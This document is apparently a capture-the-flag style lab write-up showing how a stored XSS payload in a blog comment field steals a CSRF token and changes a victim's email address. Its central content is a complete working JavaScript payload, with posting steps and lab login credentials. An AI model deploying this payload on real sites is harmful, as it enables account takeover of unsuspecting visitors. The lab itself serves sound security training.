# Exploiting XSS to bypass CSRF defenses

## Lab Overview
**Difficulty:** Practitioner  
**Vulnerability Type:** Stored XSS  
**Objective:** Steal a CSRF token and change the victim’s email address  
**Status:** ✅ Solved

---

## The Vulnerability
User comments are stored and rendered without proper sanitization. This allows a stored XSS payload to execute in other users’ browsers when they view the blog comments.

---

## Working Payload (Comment Field)

```html
<script>
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/name="csrf" value="([^"]+)"/)[1];
    return fetch('/my-account/change-email', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'csrf=' + encodeURIComponent(csrf) + '&email=attacker' + Date.now() + '@example.net'
    });
  });
</script>
```

---

## Why This Works
1. The stored XSS executes when a user views the blog comments.  
2. The payload fetches `/my-account` and extracts the CSRF token from the response.  
3. It then submits a POST request to `/my-account/change-email` using the stolen token.  
4. The email address changes successfully, solving the lab.

---

## Step-by-Step
1. Log in as `wiener:peter`.
2. Open any blog post and submit a comment containing the payload above.
3. Verify it works on your account using a unique email address.
4. Post the final payload (with your final email choice) and deliver to the victim.
5. Lab status updates to **Solved** ✅.

---

## Notes
- Use a unique email for testing to avoid conflicts with existing addresses.  
- Keep the payload in the **Comment** field for execution on victim views.

---

**Date Completed:** February 3, 2026  
**Payload Used:** Stored XSS + CSRF token exfiltration from `/my-account`
